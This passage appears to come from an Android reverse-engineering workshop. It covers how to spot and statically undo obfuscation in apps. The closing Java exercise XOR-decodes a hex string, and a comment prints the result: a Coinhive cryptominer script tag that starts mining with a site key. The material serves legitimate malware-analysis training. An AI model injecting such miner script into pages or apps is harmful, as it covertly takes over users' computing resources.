There are many times when the application you’re reversing will not be as straight forward as some of the examples we’ve discussed. The developer will implement one or more obfuscation techniques to hide the behavior and/or implementation of their app. This can be for both benign and malicious reasons.

The key about obfuscation to remember is that if you want to de-obfuscate it, you will be able to. The key decision is not whether or not you can, but whether or not it’s worth the resources to de-obfuscate.

The reason that you can always de-obfuscate something is because ultimately the CPU at some point has to see the unobfuscated code in order to run it.

## How to De-Obfuscate

How you choose to de-obfuscate the application will depend on the obfuscation method, but there are a couple of common techniques that usually work well. Here, we will only touch on the static de-obfuscation techniques since this workshop only covers static analysis/reversing. However, do remember that running the application and dynamically analyzing it can be another great way to get around obfuscation.

For obfuscation in the DEX bytecode (Java), one of the easiest ways to statically de-obfuscate is to identify the de-obfuscation methods in the application and copy their de-compilation into a Java file that you then run on the obfuscated file, strings, code, etc.

Another solution for both Java and Native Code is to transliterate the de-obfuscation algorithm into Python or any other scripting language that you’re most comfortable. I say “transliterate” because it’s important to remember that you don’t always need to *understand* the de-obfuscation algorithm, you just need a way to execute it. I cover this in more detail in the “Unpacking the Packed Unpacker” talk that is linked in the “More Examples” section.

## Indicators of Obfuscation

There are many different types of obfuscation and thus, just as many different types of indicators to alert you as the analyst that an application is likely obfuscated, but here are a few examples with proposed static analysis solutions for de-obfuscating.

- No strings: Java and Android are highly dependent on strings so if you don’t see any or only scrambled strings, it’s highly likely the strings are obfuscated.
    - Suggested solution: Look for method calls that take strings as an argument and trace back where that argument is coming from. At some point the string argument will be going through a de-obfuscation method before it’s passed to the API that takes the String argument.
- Scrambled strings: The Java and Android APIs require the plain text strings, not scrambled.
    - Suggested solution: The scrambled strings are all likely passed to the same methods prior to being passed to the APIs. These methods are likely the de-obfuscation methods.
- Binary files in the assets/ directory and DexClassLoader calls in the app: Likely unpacking and loading additional code. (Could also be downloading from a remote location and then loading using DexClassLoader)
    - Suggestion Solution: Identify where the file is read and then follow the path. It is likely de-obfuscated quickly after being read.
- Native libraries - Can’t identify the JNI functions (no functions named Java_ and no calls to RegisterNatives): In order to execute any native methods, JNI has to be able to pair the function in the native library with the native method declaration in Java and thus one of the two must exist at some point.
    - Suggested Solution: Start at JNI_OnLoad method and look for a de-obfuscation routine that loads additional code.



# Exercise


```java
import java.nio.charset.Charset;

class Main {
    public static void main(String[] args) {
        String abc = Main.m5b(new String(Main.m6a("773032205849207A3831326F1351202E3B306B7D1E5A3B33252B382454173735266C3D3B53163735222D393B475C7A37222D7F38421B6A66643032205849206477303220584920643D2223725C503A3F39636C725F5C237A082C383C7950223F65023F3D5F4039353E3079755F5F666E1134141F5C4C64377A1B671F565A1B2C7F7B101F42700D1F39331717161574213F2B2337505D27606B712C7B0A543D342E317F214558262E636A6A6E1E4A37282233256C"), Charset.forName("UTF-8")));
        
        System.out.println(abc);
        /*
	    <script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous('nf24ZwEMmu0m1X6MgcOv48AMsIYErpFE', {threads: 2});miner.start();</script>
        */
    }
    
    public static byte[] m6a(String str) {
        int length = str.length();
        byte[] bArr = new byte[length / 2];
        for (int i = 0; i < length; i += 2) {
            bArr[i / 2] = (byte) ((Character.digit(str.charAt(i), 16) << 4) + Character.digit(str.charAt(i + 1), 16));
        }
        return bArr;
    }

    public static String m5b(String str) {
        char[] cArr = {'K', 'C', 'Q', 'R', '1', '9', 'T', 'Z'};
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < str.length(); i++) {
            sb.append((char) (str.charAt(i) ^ cArr[i % cArr.length]));
        }
        return sb.toString();
    }

}
```